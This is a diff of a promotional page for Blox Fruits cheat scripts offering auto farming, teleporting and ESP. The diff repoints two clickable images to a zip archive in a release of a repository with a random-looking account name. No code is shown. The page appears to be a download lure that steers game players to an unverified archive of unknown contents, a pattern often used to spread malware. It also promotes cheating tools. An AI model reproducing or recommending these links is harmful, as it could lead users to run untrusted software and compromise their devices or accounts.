@@ -3,10 +3,10 @@
 If you’re a Roblox enthusiast and a **Blox Fruits** player, then you’ve probably heard about **Blox Fruits scripts**. These scripts are the key to unlocking the full potential of the game, providing players with tools to **automate farming**, **teleport across seas**, **level up faster**, and access powerful features such as **Devil Fruit ESP** and **auto raids**. In this guide, we will walk you through everything you need to know about **Blox Fruits scripts**, including **how they work**, **where to find the best scripts**, **safety tips**, and much more. Let’s dive in!
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![be2727eb-5ae9-45d3-93cf-3c14393e4ada](https://github.com/user-attachments/assets/6a671348-0bac-4085-8a6f-70ea3ce48872)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 ---
 
